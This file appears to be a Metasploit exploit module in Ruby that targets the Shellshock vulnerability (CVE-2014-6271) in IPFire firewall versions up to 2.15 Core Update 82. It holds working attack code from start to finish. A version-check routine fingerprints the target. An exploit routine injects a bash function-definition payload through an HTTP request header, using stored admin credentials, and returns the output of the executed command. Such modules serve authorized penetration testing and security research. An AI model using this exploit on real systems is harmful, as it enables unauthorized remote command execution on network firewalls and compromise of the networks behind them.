##
## This module requires Metasploit: http://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'          => 'IPFire Bash Environment Variable Injection 
(Shellshock)',
        'Description'   => %q(
          IPFire, a free linux based open source firewall distribution,
          version <= 2.15 Update Core 82 contains an authenticated 
remote
          command execution vulnerability via shellshock in the request 
headers.
        ),
        'Author'         =>
          [
            'h00die <mike@stcyrsecurity.com>', # module
            'Claudio Viviani'                  # discovery
          ],
        'References'     =>
          [
            [ 'EDB', '34839' ],
            [ 'CVE', '2014-6271']
          ],
        'License'        => MSF_LICENSE,
        'Platform'       => %w( linux unix ),
        'Privileged'     => false,
        'DefaultOptions' =>
          {
            'SSL' => true,
            'PAYLOAD' => 'cmd/unix/generic'
          },
        'Arch'           => ARCH_CMD,
        'Payload'        =>
          {
            'Compat' =>
              {
                'PayloadType' => 'cmd',
                'RequiredCmd' => 'generic'
              }
          },
        'Targets'        =>
          [
            [ 'Automatic Target', {}]
          ],
        'DefaultTarget'  => 0,
        'DisclosureDate' => 'Sep 29 2014'
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [ true, 'User to login with', 
'admin']),
        OptString.new('PASSWORD', [ false, 'Password to login with', 
'']),
        Opt::RPORT(444)
      ], self.class
    )
  end

  def check
    begin
      res = send_request_cgi(
        'uri'       => '/cgi-bin/index.cgi',
        'method'    => 'GET'
      )
      fail_with(Failure::UnexpectedReply, "#{peer} - Could not connect 
to web service - no response") if res.nil?
      fail_with(Failure::UnexpectedReply, "#{peer} - Invalid credentials 
(response code: #{res.code})") if res.code == 401
      /\<strong\>IPFire (?<version>[\d.]{4}) \([\w]+\) - Core Update 
(?<update>[\d]+)/ =~ res.body

      if version && update && version == "2.15" && update.to_i < 83
        Exploit::CheckCode::Appears
      else
        Exploit::CheckCode::Safe
      end
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to 
the web service")
    end
  end

  #
  # CVE-2014-6271
  #
  def cve_2014_6271(cmd)
    %{() { :;}; /bin/bash -c "#{cmd}" }
  end

  def exploit
    begin
      payload = cve_2014_6271(datastore['CMD'])
      vprint_status("Exploiting with payload: #{payload}")
      res = send_request_cgi(
        'uri'       => '/cgi-bin/index.cgi',
        'method'    => 'GET',
        'headers'   => { 'VULN' => payload }
      )

      fail_with(Failure::UnexpectedReply, "#{peer} - Could not connect 
to web service - no response") if res.nil?
      fail_with(Failure::UnexpectedReply, "#{peer} - Invalid credentials 
(response code: #{res.code})") if res.code == 401
      /<li>Device: \/dev\/(?<output>.+) reports/m =~ res.body
      print_good(output) unless output.nil?

    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to 
the web service")
    end
  end
end
